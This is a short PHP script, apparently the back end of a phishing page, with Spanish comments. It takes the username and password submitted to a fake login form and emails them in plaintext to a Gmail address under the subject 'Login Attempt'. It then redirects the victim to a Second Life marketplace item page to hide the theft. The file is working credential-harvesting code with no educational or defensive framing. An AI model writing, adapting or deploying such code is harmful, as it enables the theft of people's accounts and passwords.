<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtén los datos del formulario
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Configura los detalles del correo
    $to = 'soyeltoby3@gmail.com';
    $subject = 'Login Attempt';
    $message = "Username: $username\nPassword: $password";
    $headers = 'From: no-reply@example.com' . "\r\n" .
               'Reply-To: no-reply@example.com' . "\r\n" .
               'X-Mailer: PHP/' . phpversion();

    // Envía el correo
    if (mail($to, $subject, $message, $headers)) {
        // Redirige a la URL deseada
        header("Location: https://marketplace.secondlife.com/s/Shape-Male-LeLUTKA-Alain-Head-25-Free-2020/20940889");
        exit();
    } else {
        echo 'Failed to send login details.';
    }
}
?>